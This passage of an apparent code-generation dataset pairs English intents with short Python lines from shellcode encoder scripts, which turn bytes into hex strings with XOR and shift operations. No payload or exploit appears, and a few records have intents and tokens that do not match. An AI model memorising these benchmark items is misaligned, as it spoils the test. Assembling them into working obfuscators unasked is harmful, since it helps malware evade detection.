    "snippet": "encoded += insertByte[2:]",
    "slot_map": {
      "insertByte": "var0"
    },
    "intent_tokens": [
      "slice",
      "variable",
      "var0",
      "at",
      "index",
      "2",
      "and",
      "add",
      "value",
      "to",
      "variable",
      "encoded"
    ],
    "snippet_tokens": [
      "encoded",
      "+=",
      "var0",
      "[",
      "2",
      ":",
      "]"
    ]
  },
  {
    "intent": "slice the variable xxx at index 2 and add the value to the variable encoded",
    "rewritten_intent": "slice the variable xxx at index 2 and add the value to the variable encoded",
    "snippet": "encoded += xxx[2:]",
    "slot_map": {},
    "intent_tokens": [
      "slice",
      "variable",
      "xxx",
      "at",
      "index",
      "2",
      "and",
      "add",
      "value",
      "to",
      "variable",
      "encoded"
    ],
    "snippet_tokens": [
      "encoded",
      "+=",
      "xxx",
      "[",
      "2",
      ":",
      "]"
    ]
  },
  {
    "intent": "set encoded to an empty string",
    "rewritten_intent": "set encoded to an empty string",
    "snippet": "encoded = ' '",
    "slot_map": {},
    "intent_tokens": [
      "set",
      "encoded",
      "to",
      "empty",
      "string"
    ],
    "snippet_tokens": [
      "encoded",
      "=",
      "'",
      "'"
    ]
  },
  {
    "intent": "set encoded to the string '\\\\x'",
    "rewritten_intent": "set encoded to the string '\\\\x'",
    "snippet": "encoded = '\\\\x'",
    "slot_map": {
      "'\\\\x'": "var0"
    },
    "intent_tokens": [
      "set",
      "encoded",
      "to",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "encoded",
      "=",
      "``",
      "\\\\x",
      "''"
    ]
  },
  {
    "intent": "encoded is a string \"\"",
    "rewritten_intent": "encoded is a string \"\"",
    "snippet": "encoded = \"\"",
    "slot_map": {
      "\"\"": "var0"
    },
    "intent_tokens": [
      "encoded",
      "is",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "encoded",
      "=",
      "var0"
    ]
  },
  {
    "intent": "encoded is string \"\"",
    "rewritten_intent": "encoded is string \"\"",
    "snippet": "encoded = \"\"",
    "slot_map": {
      "\"\"": "var0"
    },
    "intent_tokens": [
      "encoded",
      "is",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "encoded",
      "=",
      "var0"
    ]
  },
  {
    "intent": "encoded is an empty string",
    "rewritten_intent": "encoded is an empty string",
    "snippet": "encoded = \"\"",
    "slot_map": {},
    "intent_tokens": [
      "encoded",
      "is",
      "empty",
      "string"
    ],
    "snippet_tokens": [
      "encoded",
      "=",
      "``"
    ]
  },
  {
    "intent": "initialize an empty string variable called encoded",
    "rewritten_intent": "initialize an empty string variable called encoded",
    "snippet": "encoded = \"\"",
    "slot_map": {},
    "intent_tokens": [
      "initialize",
      "empty",
      "string",
      "variable",
      "called",
      "encoded"
    ],
    "snippet_tokens": [
      "encoded",
      "=",
      "``"
    ]
  },
  {
    "intent": "encoded is the concatenation of the string \"\\\\x\", the hexadecimal value of the length of array of bytes of the variable shellcode and the string ','",
    "rewritten_intent": "encoded is the concatenation of the string \"\\\\x\", the hexadecimal value of the length of array of bytes of the variable shellcode and the string ','",
    "snippet": "encoded = \"\\\\x%02x,\" % len(bytearray(shellcode))",
    "slot_map": {
      "\"\\\\x\"": "var0",
      "','": "var2",
      "shellcode": "var1"
    },
    "intent_tokens": [
      "encoded",
      "is",
      "concatenation",
      "of",
      "string",
      "var0",
      ",",
      "hexadecimal",
      "value",
      "of",
      "length",
      "of",
      "array",
      "of",
      "bytes",
      "of",
      "variable",
      "var1",
      "and",
      "string",
      "var2"
    ],
    "snippet_tokens": [
      "encoded",
      "=",
      "``",
      "\\\\x",
      "%",
      "02x",
      ",",
      "''",
      "%",
      "len",
      "(",
      "bytearray",
      "(",
      "var1",
      ")",
      ")"
    ]
  },
  {
    "intent": "encoded is an empty list",
    "rewritten_intent": "encoded is an empty list",
    "snippet": "encoded = []",
    "slot_map": {},
    "intent_tokens": [
      "encoded",
      "is",
      "empty",
      "list"
    ],
    "snippet_tokens": [
      "encoded",
      "=",
      "[",
      "]"
    ]
  },
  {
    "intent": "append end to encoded",
    "rewritten_intent": "append end to encoded",
    "snippet": "encoded = encoded + end",
    "slot_map": {},
    "intent_tokens": [
      "append",
      "end",
      "to",
      "encoded"
    ],
    "snippet_tokens": [
      "encoded",
      "=",
      "encoded",
      "+",
      "end"
    ]
  },
  {
    "intent": "encoded_instruction_in_hex is a string containing the hexadecimal conversion of rox_encoded_instruction",
    "rewritten_intent": "encoded_instruction_in_hex is a string containing the hexadecimal conversion of rox_encoded_instruction",
    "snippet": "encoded_instruction_in_hex = '%02x' % rox_encoded_instruction",
    "slot_map": {
      "rox_encoded_instruction": "var1",
      "encoded_instruction_in_hex": "var0"
    },
    "intent_tokens": [
      "var0",
      "is",
      "string",
      "containing",
      "hexadecimal",
      "conversion",
      "of",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "'",
      "%",
      "02x",
      "'",
      "%",
      "var1"
    ]
  },
  {
    "intent": "Convert the value of z bitwise and 0xff to a hexadecimal then add it to the variable encoded_nasm followed by ','",
    "rewritten_intent": "Convert the value of z bitwise and 0xff to a hexadecimal then add it to the variable encoded_nasm followed by ','",
    "snippet": "encoded_nasm += \"%02x,\" %(z & 0xff)",
    "slot_map": {
      "','": "var3",
      "encoded_nasm": "var1",
      "bitwise": "var0"
    },
    "intent_tokens": [
      "Convert",
      "value",
      "of",
      "z",
      "var0",
      "and",
      "0xff",
      "to",
      "hexadecimal",
      "then",
      "add",
      "it",
      "to",
      "variable",
      "var1",
      "followed",
      "by",
      "var3"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "'",
      "%",
      "02x",
      ",",
      "'",
      "%",
      "(",
      "z",
      "&",
      "255",
      ")"
    ]
  },
  {
    "intent": "add the string value '0x' to the variable encoded_nasm",
    "rewritten_intent": "add the string value '0x' to the variable encoded_nasm",
    "snippet": "encoded_nasm += \"0x\"",
    "slot_map": {
      "'0x'": "var0",
      "encoded_nasm": "var1"
    },
    "intent_tokens": [
      "add",
      "string",
      "value",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "'0x",
      "'"
    ]
  },
  {
    "intent": "initialize the variable encoded_nasm to an empty string",
    "rewritten_intent": "initialize the variable encoded_nasm to an empty string",
    "snippet": "encoded_nasm = \"\"",
    "slot_map": {
      "encoded_nasm": "var0"
    },
    "intent_tokens": [
      "initialize",
      "variable",
      "var0",
      "to",
      "empty",
      "string"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "``"
    ]
  },
  {
    "intent": "append the hexadecimal conversion of byte followed by ', ' to the string encoded_shellcode",
    "rewritten_intent": "append the hexadecimal conversion of byte followed by ', ' to the string encoded_shellcode",
    "snippet": "encoded_shellcode += '%02x, ' %byte",
    "slot_map": {
      "', '": "var0",
      "encoded_shellcode": "var1"
    },
    "intent_tokens": [
      "append",
      "hexadecimal",
      "conversion",
      "of",
      "byte",
      "followed",
      "by",
      "var0",
      "to",
      "string",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "'",
      "%",
      "02x",
      ",",
      "'",
      "%",
      "byte"
    ]
  },
  {
    "intent": "append the hexadecimal conversion of new followed by ', ' to the string encoded_shellcode",
    "rewritten_intent": "append the hexadecimal conversion of new followed by ', ' to the string encoded_shellcode",
    "snippet": "encoded_shellcode += '%02x, ' %new",
    "slot_map": {
      "', '": "var0",
      "encoded_shellcode": "var1"
    },
    "intent_tokens": [
      "append",
      "hexadecimal",
      "conversion",
      "of",
      "new",
      "followed",
      "by",
      "var0",
      "to",
      "string",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "'",
      "%",
      "02x",
      ",",
      "'",
      "%",
      "new"
    ]
  },
  {
    "intent": "convert shift to hexadecimal and append it followed by ', ' to the string encoded_shellcode",
    "rewritten_intent": "convert shift to hexadecimal and append it followed by ', ' to the string encoded_shellcode",
    "snippet": "encoded_shellcode += '%02x, ' %shift",
    "slot_map": {
      "', '": "var0",
      "encoded_shellcode": "var1"
    },
    "intent_tokens": [
      "convert",
      "shift",
      "to",
      "hexadecimal",
      "and",
      "append",
      "it",
      "followed",
      "by",
      "var0",
      "to",
      "string",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "'",
      "%",
      "02x",
      ",",
      "'",
      "%",
      "shift"
    ]
  },
  {
    "intent": "convert xor in hexadecimal and append it followed by ', ' to the string encoded_shellcode",
    "rewritten_intent": "convert xor in hexadecimal and append it followed by ', ' to the string encoded_shellcode",
    "snippet": "encoded_shellcode += '%02x, ' %xor",
    "slot_map": {
      "', '": "var0",
      "encoded_shellcode": "var1"
    },
    "intent_tokens": [
      "convert",
      "xor",
      "in",
      "hexadecimal",
      "and",
      "append",
      "it",
      "followed",
      "by",
      "var0",
      "to",
      "string",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "'",
      "%",
      "02x",
      ",",
      "'",
      "%",
      "xor"
    ]
  },
  {
    "intent": "append '0x' to the string encoded_shellcode",
    "rewritten_intent": "append '0x' to the string encoded_shellcode",
    "snippet": "encoded_shellcode += '0x'",
    "slot_map": {
      "'0x'": "var0",
      "encoded_shellcode": "var1"
    },
    "intent_tokens": [
      "append",
      "var0",
      "to",
      "string",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "var0"
    ]
  },
  {
    "intent": "add the string value '\\\\x' to the variable encoded_shellcode",
    "rewritten_intent": "add the string value '\\\\x' to the variable encoded_shellcode",
    "snippet": "encoded_shellcode += \"\\\\x\"",
    "slot_map": {
      "'\\\\x'": "var0",
      "encoded_shellcode": "var1"
    },
    "intent_tokens": [
      "add",
      "string",
      "value",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "``",
      "\\\\x",
      "''"
    ]
  },
  {
    "intent": "Convert the value of z bitwise and 0xff to a hexadecimal then add it to the variable encoded_shellcode",
    "rewritten_intent": "Convert the value of z bitwise and 0xff to a hexadecimal then add it to the variable encoded_shellcode",
    "snippet": "encoded_shellcode += \"%02x\" %(z & 0xff)",
    "slot_map": {
      "encoded_shellcode": "var1",
      "bitwise": "var0"
    },
    "intent_tokens": [
      "Convert",
      "value",
      "of",
      "z",
      "var0",
      "and",
      "0xff",
      "to",
      "hexadecimal",
      "then",
      "add",
      "it",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "'",
      "%",
      "02x",
      "'",
      "%",
      "(",
      "z",
      "&",
      "255",
      ")"
    ]
  },
  {
    "intent": "encoded_shellcode is a string \"\"",
    "rewritten_intent": "encoded_shellcode is a string \"\"",
    "snippet": "encoded_shellcode = \"\"",
    "slot_map": {
      "\"\"": "var1",
      "encoded_shellcode": "var0"
    },
    "intent_tokens": [
      "var0",
      "is",
      "string",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "var1"
    ]
  },
  {
    "intent": "initialize the variable encoded_shellcode to an empty string",
    "rewritten_intent": "initialize the variable encoded_shellcode to an empty string",
    "snippet": "encoded_shellcode = \"\"",
    "slot_map": {
      "encoded_shellcode": "var0"
    },
    "intent_tokens": [
      "initialize",
      "variable",
      "var0",
      "to",
      "empty",
      "string"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "``"
    ]
  },
  {
    "intent": "append to encoded a bytes object containing the value val1 packed according to the format string unsigned char",
    "rewritten_intent": "append to encoded a bytes object containing the value val1 packed according to the format string unsigned char",
    "snippet": "encoded.append(struct.pack('B', val1))",
    "slot_map": {
      "val1": "var0"
    },
    "intent_tokens": [
      "append",
      "to",
      "encoded",
      "bytes",
      "object",
      "containing",
      "value",
      "var0",
      "packed",
      "according",
      "to",
      "format",
      "string",
      "unsigned",
      "char"
    ],
    "snippet_tokens": [
      "encoded.append",
      "(",
      "struct.pack",
      "(",
      "'",
      "B",
      "'",
      ",",
      "var0",
      ")",
      ")"
    ]
  },
  {
    "intent": "append to encoded a bytes object containing the value xor_byte packed according to the format string unsigned char",
    "rewritten_intent": "append to encoded a bytes object containing the value xor_byte packed according to the format string unsigned char",
    "snippet": "encoded.append(struct.pack('B', xor_byte))",
    "slot_map": {
      "xor_byte": "var0"
    },
    "intent_tokens": [
      "append",
      "to",
      "encoded",
      "bytes",
      "object",
      "containing",
      "value",
      "var0",
      "packed",
      "according",
      "to",
      "format",
      "string",
      "unsigned",
      "char"
    ],
    "snippet_tokens": [
      "encoded.append",
      "(",
      "struct.pack",
      "(",
      "'",
      "B",
      "'",
      ",",
      "var0",
      ")",
      ")"
    ]
  },
  {
    "intent": "add to encoded a bytes object containing the value xor_byte packed according to the format string unsigned char",
    "rewritten_intent": "add to encoded a bytes object containing the value xor_byte packed according to the format string unsigned char",
    "snippet": "encoded.append(struct.pack('B', xor_byte))",
    "slot_map": {
      "xor_byte": "var0"
    },
    "intent_tokens": [
      "add",
      "to",
      "encoded",
      "bytes",
      "object",
      "containing",
      "value",
      "var0",
      "packed",
      "according",
      "to",
      "format",
      "string",
      "unsigned",
      "char"
    ],
    "snippet_tokens": [
      "encoded.append",
      "(",
      "struct.pack",
      "(",
      "'",
      "B",
      "'",
      ",",
      "var0",
      ")",
      ")"
    ]
  },
  {
    "intent": "append to encoded the bytes object containing the value xor_byte packed according to the format string unsigned char",
    "rewritten_intent": "append to encoded the bytes object containing the value xor_byte packed according to the format string unsigned char",
    "snippet": "encoded.append(struct.pack('B', xor_byte))",
    "slot_map": {
      "xor_byte": "var0"
    },
    "intent_tokens": [
      "append",
      "to",
      "encoded",
      "bytes",
      "object",
      "containing",
      "value",
      "var0",
      "packed",
      "according",
      "to",
      "format",
      "string",
      "unsigned",
      "char"
    ],
    "snippet_tokens": [
      "encoded.append",
      "(",
      "struct.pack",
      "(",
      "'",
      "B",
      "'",
      ",",
      "var0",
      ")",
      ")"
    ]
  },
  {
    "intent": "add the string value '\\\\x' to the variable encoded1",
    "rewritten_intent": "add the string value '\\\\x' to the variable encoded1",
    "snippet": "encoded1 += '\\\\x'",
    "slot_map": {
      "'\\\\x'": "var0",
      "encoded1": "var1"
    },
    "intent_tokens": [
      "add",
      "string",
      "value",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "``",
      "\\\\x",
      "''"
    ]
  },
  {
    "intent": "Convert the value of j to a hexadecimal then add it to the variable encoded1",
    "rewritten_intent": "Convert the value of j to a hexadecimal then add it to the variable encoded1",
    "snippet": "encoded1 += '%02x' %j",
    "slot_map": {
      "encoded1": "var0"
    },
    "intent_tokens": [
      "Convert",
      "value",
      "of",
      "j",
      "to",
      "hexadecimal",
      "then",
      "add",
      "it",
      "to",
      "variable",
      "var0"
    ],
    "snippet_tokens": [
      "var0",
      "+=",
      "'",
      "%",
      "02x",
      "'",
      "%",
      "j"
    ]
  },
  {
    "intent": "initialize an empty string variable called encoded1",
    "rewritten_intent": "initialize an empty string variable called encoded1",
    "snippet": "encoded1 = \"\"",
    "slot_map": {
      "encoded1": "var0"
    },
    "intent_tokens": [
      "initialize",
      "empty",
      "string",
      "variable",
      "called",
      "var0"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "``"
    ]
  },
  {
    "intent": "add the string value ',' to the variable encoded2",
    "rewritten_intent": "add the string value ',' to the variable encoded2",
    "snippet": "encoded2 += ','",
    "slot_map": {
      "','": "var0",
      "encoded2": "var1"
    },
    "intent_tokens": [
      "add",
      "string",
      "value",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "var0"
    ]
  },
  {
    "intent": "Convert the value of j to a hexadecimal then add it to the variable encoded2 followed by the string ', '",
    "rewritten_intent": "Convert the value of j to a hexadecimal then add it to the variable encoded2 followed by the string ', '",
    "snippet": "encoded2 += '%02x, ' %j",
    "slot_map": {
      "', '": "var1",
      "encoded2": "var0"
    },
    "intent_tokens": [
      "Convert",
      "value",
      "of",
      "j",
      "to",
      "hexadecimal",
      "then",
      "add",
      "it",
      "to",
      "variable",
      "var0",
      "followed",
      "by",
      "string",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      "+=",
      "'",
      "%",
      "02x",
      ",",
      "'",
      "%",
      "j"
    ]
  },
  {
    "intent": "Convert the value of y bitwise and 0xff to a hexadecimal then add it to the variable encoded2 followed by the string ','",
    "rewritten_intent": "Convert the value of y bitwise and 0xff to a hexadecimal then add it to the variable encoded2 followed by the string ','",
    "snippet": "encoded2 += '%02x,' % (y & 0xff)",
    "slot_map": {
      "','": "var2",
      "bitwise": "var0",
      "encoded2": "var1"
    },
    "intent_tokens": [
      "Convert",
      "value",
      "of",
      "y",
      "var0",
      "and",
      "0xff",
      "to",
      "hexadecimal",
      "then",
      "add",
      "it",
      "to",
      "variable",
      "var1",
      "followed",
      "by",
      "string",
      "var2"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "'",
      "%",
      "02x",
      ",",
      "'",
      "%",
      "(",
      "y",
      "&",
      "255",
      ")"
    ]
  },
  {
    "intent": "Convert the value of x to a hexadecimal then add it to the variable encoded2 followed by the string ', '",
    "rewritten_intent": "Convert the value of x to a hexadecimal then add it to the variable encoded2 followed by the string ', '",
    "snippet": "encoded2 += '%02x,' % x",
    "slot_map": {
      "', '": "var1",
      "encoded2": "var0"
    },
    "intent_tokens": [
      "Convert",
      "value",
      "of",
      "x",
      "to",
      "hexadecimal",
      "then",
      "add",
      "it",
      "to",
      "variable",
      "var0",
      "followed",
      "by",
      "string",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      "+=",
      "'",
      "%",
      "02x",
      ",",
      "'",
      "%",
      "x"
    ]
  },
  {
    "intent": "Convert the variable x to a hexadecimal. Concatenate the result with the string ',' add the result to the variable encoded2",
    "rewritten_intent": "Convert the variable x to a hexadecimal. Concatenate the result with the string ',' add the result to the variable encoded2",
    "snippet": "encoded2 += '%02x,' % x",
    "slot_map": {
      "','": "var1",
      "Concatenate": "var0",
      "encoded2": "var2"
    },
    "intent_tokens": [
      "Convert",
      "variable",
      "x",
      "to",
      "hexadecimal",
      "var0",
      "result",
      "with",
      "string",
      "var1",
      "add",
      "result",
      "to",
      "variable",
      "var2"
    ],
    "snippet_tokens": [
      "var2",
      "+=",
      "'",
      "%",
      "02x",
      ",",
      "'",
      "%",
      "x"
    ]
  },
  {
    "intent": "Convert the variable y to a hexadecimal. Concatenate the result with the string ',' and add the result to the variable encoded2",
    "rewritten_intent": "Convert the variable y to a hexadecimal. Concatenate the result with the string ',' and add the result to the variable encoded2",
    "snippet": "encoded2 += '%02x,' % y",
    "slot_map": {
      "','": "var1",
      "Concatenate": "var0",
      "encoded2": "var2"
    },
    "intent_tokens": [
      "Convert",
      "variable",
      "y",
      "to",
      "hexadecimal",
      "var0",
      "result",
      "with",
      "string",
      "var1",
      "and",
      "add",
      "result",
      "to",
      "variable",
      "var2"
    ],
    "snippet_tokens": [
      "var2",
      "+=",
      "'",
      "%",
      "02x",
      ",",
      "'",
      "%",
      "y"
    ]
  },
  {
    "intent": "convert (7 -(256 - x)) to hexadecimal, concatenate the result with the string ',' and append it to the string encoded2",
    "rewritten_intent": "convert (7 -(256 - x)) to hexadecimal, concatenate the result with the string ',' and append it to the string encoded2",
    "snippet": "encoded2 += '%02x,' %(7 -(256 - x))",
    "slot_map": {
      "','": "var1",
      "-(256": "var0",
      "encoded2": "var2"
    },
    "intent_tokens": [
      "convert",
      "(",
      "7",
      "var0",
      "-",
      "x",
      ")",
      ")",
      "to",
      "hexadecimal",
      ",",
      "concatenate",
      "result",
      "with",
      "string",
      "var1",
      "and",
      "append",
      "it",
      "to",
      "string",
      "var2"
    ],
    "snippet_tokens": [
      "var2",
      "+=",
      "'",
      "%",
      "02x",
      ",",
      "'",
      "%",
      "y"
    ]
  },
  {
    "intent": "Convert the value of h bitwise and 0xff to a hexadecimal, concatenate the result with the string ',' and then add it to the variable encoded2",
    "rewritten_intent": "Convert the value of h bitwise and 0xff to a hexadecimal, concatenate the result with the string ',' and then add it to the variable encoded2",
    "snippet": "encoded2 += '%02x,' %(h & 0xff)",
    "slot_map": {
      "','": "var1",
      "bitwise": "var0",
      "encoded2": "var2"
    },
    "intent_tokens": [
      "Convert",
      "value",
      "of",
      "h",
      "var0",
      "and",
      "0xff",
      "to",
      "hexadecimal",
      ",",
      "concatenate",
      "result",
      "with",
      "string",
      "var1",
      "and",
      "then",
      "add",
      "it",
      "to",
      "variable",
      "var2"
    ],
    "snippet_tokens": [
      "var2",
      "+=",
      "'",
      "%",
      "02x",
      ",",
      "'",
      "%",
      "(",
      "h",
      "&",
      "255",
      ")"
    ]
  },
  {
    "intent": "convert (x+7) to hexadecimal, concatenate the result with the string ',' and append it to the string encoded2",
    "rewritten_intent": "convert (x+7) to hexadecimal, concatenate the result with the string ',' and append it to the string encoded2",
    "snippet": "encoded2 += '%02x,' %(x+7)",
    "slot_map": {
      "','": "var1",
      "x+7": "var0",
      "encoded2": "var2"
    },
    "intent_tokens": [
      "convert",
      "(",
      "x+7",
      ")",
      "to",
      "hexadecimal",
      ",",
      "concatenate",
      "result",
      "with",
      "string",
      "var1",
      "and",
      "append",
      "it",
      "to",
      "string",
      "var2"
    ],
    "snippet_tokens": [
      "var2",
      "+=",
      "'",
      "%",
      "02x",
      ",",
      "'",
      "%",
      "var0"
    ]
  },
  {
    "intent": "Convert the value of y to a hexadecimal, concatenate the result with the string ',' and then add it to the variable encoded2",
    "rewritten_intent": "Convert the value of y to a hexadecimal, concatenate the result with the string ',' and then add it to the variable encoded2",
    "snippet": "encoded2 += '%02x,' %y",
    "slot_map": {
      "','": "var0",
      "encoded2": "var1"
    },
    "intent_tokens": [
      "Convert",
      "value",
      "of",
      "y",
      "to",
      "hexadecimal",
      ",",
      "concatenate",
      "result",
      "with",
      "string",
      "var0",
      "and",
      "then",
      "add",
      "it",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "'",
      "%",
      "02x",
      ",",
      "'",
      "%",
      "y"
    ]
  },
  {
    "intent": "append string '0x' to encoded2",
    "rewritten_intent": "append string '0x' to encoded2",
    "snippet": "encoded2 += '0x'",
    "slot_map": {
      "'0x'": "var0",
      "encoded2": "var1"
    },
    "intent_tokens": [
      "append",
      "string",
      "var0",
      "to",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "var0"
    ]
  },
  {
    "intent": "append '0x' to the string encoded2",
    "rewritten_intent": "append '0x' to the string encoded2",
    "snippet": "encoded2 += '0x'",
    "slot_map": {
      "'0x'": "var0",
      "encoded2": "var1"
    },
    "intent_tokens": [
      "append",
      "var0",
      "to",
      "string",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "var0"
    ]
  },
  {
    "intent": "add the string value '0x' to the variable encoded2",
    "rewritten_intent": "add the string value '0x' to the variable encoded2",
    "snippet": "encoded2 += '0x'",
    "slot_map": {
      "'0x'": "var0",
      "encoded2": "var1"
    },
    "intent_tokens": [
      "add",
      "string",
      "value",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "var0"
    ]
  },
  {
    "intent": "concatenate the string '0x' with the hexadecimal conversion of 0xAA and append the result to the string encoded2",
    "rewritten_intent": "concatenate the string '0x' with the hexadecimal conversion of 0xAA and append the result to the string encoded2",
    "snippet": "encoded2 += '0x%02x,' % 0xAA",
    "slot_map": {
      "'0x'": "var0",
      "encoded2": "var1"
    },
    "intent_tokens": [
      "concatenate",
      "string",
      "var0",
      "with",
      "hexadecimal",
      "conversion",
      "of",
      "0xAA",
      "and",
      "append",
      "result",
      "to",
      "string",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "'0x",
      "%",
      "02x",
      ",",
      "'",
      "%",
      "170"
    ]
  },
  {
    "intent": "concatenate the string '0x' with the hexadecimal conversion of rand and append the result to the string encoded2",
    "rewritten_intent": "concatenate the string '0x' with the hexadecimal conversion of rand and append the result to the string encoded2",
    "snippet": "encoded2 += '0x%02x,' % rand",
    "slot_map": {
      "'0x'": "var0",
      "encoded2": "var1"
    },
    "intent_tokens": [
      "concatenate",
      "string",
      "var0",
      "with",
      "hexadecimal",
      "conversion",
      "of",
      "rand",
      "and",
      "append",
      "result",
      "to",
      "string",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "'0x",
      "%",
      "02x",
      ",",
      "'",
      "%",
      "rand"
    ]
  },
  {
    "intent": "Convert the value of leader to hexadecimal, then slice it at the index of 2 and add its value to the variable encoded2",
    "rewritten_intent": "Convert the value of leader to hexadecimal, then slice it at the index of 2 and add its value to the variable encoded2",
    "snippet": "encoded2 += hex(leader)[2:]",
    "slot_map": {
      "encoded2": "var0"
    },
    "intent_tokens": [
      "Convert",
      "value",
      "of",
      "leader",
      "to",
      "hexadecimal",
      ",",
      "then",
      "slice",
      "it",
      "at",
      "index",
      "of",
      "2",
      "and",
      "add",
      "its",
      "value",
      "to",
      "variable",
      "var0"
    ],
    "snippet_tokens": [
      "var0",
      "+=",
      "hex",
      "(",
      "leader",
      ")",
      "[",
      "2",
      ":",
      "]"
    ]
  },
  {
    "intent": "slice the variable insertByte at index 2 and add the value to the variable encoded2",
    "rewritten_intent": "slice the variable insertByte at index 2 and add the value to the variable encoded2",
    "snippet": "encoded2 += insertByte[2:]",
    "slot_map": {
      "insertByte": "var0",
      "encoded2": "var1"
    },
    "intent_tokens": [
      "slice",
      "variable",
      "var0",
      "at",
      "index",
      "2",
      "and",
      "add",
      "value",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "var0",
      "[",
      "2",
      ":",
      "]"
    ]
  },
  {
    "intent": "add the value of xxx to the variable encoded2",
    "rewritten_intent": "add the value of xxx to the variable encoded2",
    "snippet": "encoded2 += xxx",
    "slot_map": {
      "encoded2": "var0"
    },
    "intent_tokens": [
      "add",
      "value",
      "of",
      "xxx",
      "to",
      "variable",
      "var0"
    ],
    "snippet_tokens": [
      "var0",
      "+=",
      "xxx"
    ]
  },
  {
    "intent": "set the variable encoded2 to an empty string",
    "rewritten_intent": "set the variable encoded2 to an empty string",
    "snippet": "encoded2 = ' '",
    "slot_map": {
      "encoded2": "var0"
    },
    "intent_tokens": [
      "set",
      "variable",
      "var0",
      "to",
      "empty",
      "string"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "'",
      "'"
    ]
  },
  {
    "intent": "set encoded2 to the string '0x'",
    "rewritten_intent": "set encoded2 to the string '0x'",
    "snippet": "encoded2 = '0x'",
    "slot_map": {
      "'0x'": "var1",
      "encoded2": "var0"
    },
    "intent_tokens": [
      "set",
      "var0",
      "to",
      "string",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "var1"
    ]
  },
  {
    "intent": "encoded2 is a string \"\"",
    "rewritten_intent": "encoded2 is a string \"\"",
    "snippet": "encoded2 = \"\"",
    "slot_map": {
      "\"\"": "var1",
      "encoded2": "var0"
    },
    "intent_tokens": [
      "var0",
      "is",
      "string",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "var1"
    ]
  },
  {
    "intent": "encoded2 is string \"\"",
    "rewritten_intent": "encoded2 is string \"\"",
    "snippet": "encoded2 = \"\"",
    "slot_map": {
      "\"\"": "var1",
      "encoded2": "var0"
    },
    "intent_tokens": [
      "var0",
      "is",
      "string",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "var1"
    ]
  },
  {
    "intent": "encoded2 is an empty string",
    "rewritten_intent": "encoded2 is an empty string",
    "snippet": "encoded2 = \"\"",
    "slot_map": {
      "encoded2": "var0"
    },
    "intent_tokens": [
      "var0",
      "is",
      "empty",
      "string"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "``"
    ]
  },
  {
    "intent": "initialize an empty string variable called encoded2",
    "rewritten_intent": "initialize an empty string variable called encoded2",
    "snippet": "encoded2 = \"\"",
    "slot_map": {
      "encoded2": "var0"
    },
    "intent_tokens": [
      "initialize",
      "empty",
      "string",
      "variable",
      "called",
      "var0"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "``"
    ]
  },
  {
    "intent": "encoded2 is the concatenation of the string \"0x\" with the hexadecimal conversion of the lenght of the array of bytes of shellcode",
    "rewritten_intent": "encoded2 is the concatenation of the string \"0x\" with the hexadecimal conversion of the lenght of the array of bytes of shellcode",
    "snippet": "encoded2 = \"0x%02x,\" % len(bytearray(shellcode))",
    "slot_map": {
      "\"0x\"": "var1",
      "encoded2": "var0",
      "lenght": "var2",
      "shellcode": "var3"
    },
    "intent_tokens": [
      "var0",
      "is",
      "concatenation",
      "of",
      "string",
      "var1",
      "with",
      "hexadecimal",
      "conversion",
      "of",
      "var2",
      "of",
      "array",
      "of",
      "bytes",
      "of",
      "var3"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "'0x",
      "%",
      "02x",
      ",",
      "'",
      "%",
      "len",
      "(",
      "bytearray",
      "(",
      "var3",
      ")",
      ")"
    ]
  },
  {
    "intent": "convert the value x to hex, concatenate the result with ',' and append it to the string encoded2P2",
    "rewritten_intent": "convert the value x to hex, concatenate the result with ',' and append it to the string encoded2P2",
    "snippet": "encoded2P2 += '%02x,' % x",
    "slot_map": {
      "','": "var0",
      "encoded2P2": "var1"
    },
    "intent_tokens": [
      "convert",
      "value",
      "x",
      "to",
      "hex",
      ",",
      "concatenate",
      "result",
      "with",
      "var0",
      "and",
      "append",
      "it",
      "to",
      "string",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "'",
      "%",
      "02x",
      ",",
      "'",
      "%",
      "x"
    ]
  },
  {
    "intent": "append string '0x' to encoded2P2",
    "rewritten_intent": "append string '0x' to encoded2P2",
